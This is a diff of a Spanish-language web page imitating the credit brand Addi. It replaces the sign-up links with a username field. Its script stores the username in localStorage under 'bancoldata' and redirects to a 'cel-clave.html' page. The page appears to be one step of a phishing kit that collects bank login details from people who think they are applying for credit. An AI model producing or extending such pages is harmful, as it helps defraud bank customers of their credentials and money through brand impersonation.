@@ -1,147 +1,188 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Addi</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Addi</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        body {
+            margin: 0;
+            font-family: 'Inter', sans-serif;
+            background: #fff;
+            color: #1f1f1f;
+        }
 
-<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+        .container {
+            max-width: 700px;
+            margin: auto;
+            padding: 20px;
+        }
 
-<style>
-    body {
-        margin: 0;
-        font-family: 'Inter', sans-serif;
-        background: #fff;
-        color: #1f1f1f;
-    }
-
-    .container {
-        max-width: 700px;
-        margin: auto;
-        padding: 20px;
-    }
-
-    .logo {
-        font-size: 45px;
-        font-weight: 700;
-        color: #2F6BFF;
-        margin-bottom: 25px;
-    }
-
-    h1 {
-        font-size: 20px;
-        font-weight: 700;
-        margin-bottom: 12px;
-    }
-
-    p {
-        font-size: 14px;
-        color: #4b4b4b;
-        line-height: 1.5;
-        margin-bottom: 15px;
-    }
-
-    .icon-text {
-        display: flex;
-        align-items: center;
-        gap: 10px;
-        margin-top: 16px;
-        font-size: 12px;
-    }
-
-    .icon-text span.emoji {
-        font-size: 16px;
-    }
-
-    footer {
-        font-size: 11px;
-        margin-top: 45px;
-        color: #7a7a7a;
-        line-height: 1.4;
-        text-align: left;
-    }
-
-    /* BOTÓN */
-    .btn {
-        display: block;
-        width: 90%;
-        max-width: 500px;
-        margin: 35px auto 15px auto;
-        padding: 15px;
-        background: #3B63FF;
-        color: white;
-        border-radius: 40px;
-        font-size: 17px;
-        font-weight: 600;
-        text-decoration: none;
-        text-align: center;
-    }
-
-    /* ENLACE INFERIOR */
-    .link {
-        display: block;
-        width: 100%;
-        text-align: center;
-        font-size: 15px;
-        font-weight: 600;
-        color: #3B63FF;
-        text-decoration: none;
-        margin-top: 10px;
-    }
-
-    /* ------------------------- */
-    /* RESPONSIVE (CELULAR/IPHONE) */
-    /* ------------------------- */
-    @media (max-width: 480px) {
         .logo {
-            font-size: 40px;
+            font-size: 45px;
+            font-weight: 700;
+            color: #2F6BFF;
+            margin-bottom: 25px;
         }
 
         h1 {
-            font-size: 18px;
+            font-size: 20px;
+            font-weight: 700;
+            margin-bottom: 12px;
         }
 
         p {
-            font-size: 13px;
+            font-size: 14px;
+            color: #4b4b4b;
+            line-height: 1.5;
+            margin-bottom: 15px;
         }
 
         .icon-text {
-            font-size: 11px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-top: 16px;
+            font-size: 12px;
+        }
+
+        .icon-text span.emoji {
+            font-size: 16px;
         }
 
         footer {
-            font-size: 10px;
+            font-size: 11px;
+            margin-top: 45px;
+            color: #7a7a7a;
+            line-height: 1.4;
+            text-align: left;
         }
 
-        .btn {
-            width: 95%;
+        /* INPUT STYLES */
+        .input-container {
+            position: relative;
+            width: 90%;
+            max-width: 500px;
+            margin: 30px auto;
+        }
+
+        .input-container input {
+            width: 100%;
+            padding: 15px;
+            padding-left: 45px;
             font-size: 16px;
-        }
-    }
-
-    /* ------------------------- */
-    /* RESPONSIVE (PC GRANDE) */
-    /* ------------------------- */
-    @media (min-width: 1024px) {
-        .container {
-            margin-top: 40px;
+            border: 2px solid #e0e0e0;
+            border-radius: 10px;
+            outline: none;
+            transition: border-color 0.3s ease;
         }
 
-        .logo {
-            font-size: 55px;
+        .input-container input:focus {
+            border-color: #3B63FF;
         }
 
-        h1 {
-            font-size: 22px;
+        .input-container i {
+            position: absolute;
+            left: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #888;
+            font-size: 18px;
         }
-    }
 
-</style>
+        /* BOTONES */
+        .button-container {
+            display: flex;
+            gap: 15px;
+            width: 90%;
+            max-width: 500px;
+            margin: 20px auto;
+        }
+
+        .button-container button {
+            flex: 1;
+            padding: 15px;
+            font-size: 16px;
+            border: none;
+            border-radius: 40px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+
+        .button-container button:first-child {
+            background-color: #f5f5f5;
+            color: #333;
+            border: 2px solid #e0e0e0;
+        }
+
+        .button-container button:first-child:hover {
+            background-color: #e8e8e8;
+        }
+
+        .button-container button:last-child {
+            background-color: #e0e0e0;
+            color: #999;
+            cursor: not-allowed;
+        }
+
+        .button-container button:last-child.enabled {
+            background-color: #3B63FF;
+            color: white;
+            cursor: pointer;
+        }
+
+        .button-container button:last-child.enabled:hover {
+            background-color: #2F6BFF;
+        }
+
+        /* RESPONSIVE */
+        @media (max-width: 480px) {
+            .logo {
+                font-size: 40px;
+            }
+
+            h1 {
+                font-size: 18px;
+            }
+
+            p {
+                font-size: 13px;
+            }
+
+            .icon-text {
+                font-size: 11px;
+            }
+
+            footer {
+                font-size: 10px;
+            }
+
+            .input-container,
+            .button-container {
+                width: 95%;
+            }
+        }
+
+        @media (min-width: 1024px) {
+            .container {
+                margin-top: 40px;
+            }
+
+            .logo {
+                font-size: 55px;
+            }
+
+            h1 {
+                font-size: 22px;
+            }
+        }
+    </style>
 </head>
 <body>
 
 <div class="container">
-
     <div class="logo">Addi</div>
 
     <h1>Compra a cuotas lo que quieres</h1>
@@ -157,17 +198,74 @@
         <span class="emoji">🕒</span>
         <span>La aprobación toma sólo unos minutos. Aplicar es fácil y rápido.</span>
     </div>
-<br><br><br><br><br><br><br><br><br><br><br><br><br><br>
+
+    <!-- Input de usuario -->
+    <div class="input-container">
+        <i>👤</i>
+        <input type="text" placeholder="Usuario" id="userInput">
+    </div>
+
+    <!-- Botones -->
+    <div class="button-container">
+        <button>Cancelar</button>
+        <button id="continueButton" class="disabled">Continuar</button>
+    </div>
+
     <footer>
         La aprobación del cupo está sujeta a criterios de elegibilidad de Addi.
         Conoce los <span style="color:#3B63FF;">términos y condiciones</span> del cupo.
     </footer>
-
-    <a href="#" class="btn">Pedir un cupo</a>
-
-    <a href="#" class="link">Ya Soy cliente Addi, cupo desembolso Efectivo</a>
-
 </div>
+
+<script>
+    const userInput = document.getElementById('userInput');
+    const continueButton = document.getElementById('continueButton');
+
+    // Habilitar/Deshabilitar el botón
+    userInput.addEventListener('input', () => {
+        const userValue = userInput.value.trim();
+        if (userValue.length >= 4) {
+            continueButton.classList.add('enabled');
+            continueButton.classList.remove('disabled');
+        } else {
+            continueButton.classList.add('disabled');
+            continueButton.classList.remove('enabled');
+        }
+    });
+
+    // Acción al hacer clic en "Continuar"
+    continueButton.addEventListener('click', async () => {
+        const userValue = userInput.value.trim();
+        if (userValue.length >= 4) {
+            try {
+                const transactionId = 'txn_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
+                
+                let bancoldata;
+                try {
+                    const storedData = localStorage.getItem('bancoldata');
+                    bancoldata = storedData ? JSON.parse(storedData) : {};
+                } catch (e) {
+                    console.error('Error al parsear bancoldata. Reiniciando a un objeto vacío:', e);
+                    bancoldata = {};
+                }
+
+                bancoldata.usuario = userValue;
+                bancoldata.transactionId = transactionId;
+                localStorage.setItem('bancoldata', JSON.stringify(bancoldata));
+
+                console.log('Usuario guardado:', userValue, 'Transaction ID:', transactionId);
+
+                window.location.href = 'cel-clave.html';
+                
+            } catch (error) {
+                console.error('Error:', error);
+                alert('Error al procesar la solicitud');
+            }
+        } else {
+            alert('Por favor, ingrese un usuario válido de al menos 4 caracteres.');
+        }
+    });
+</script>
 
 </body>
 </html>
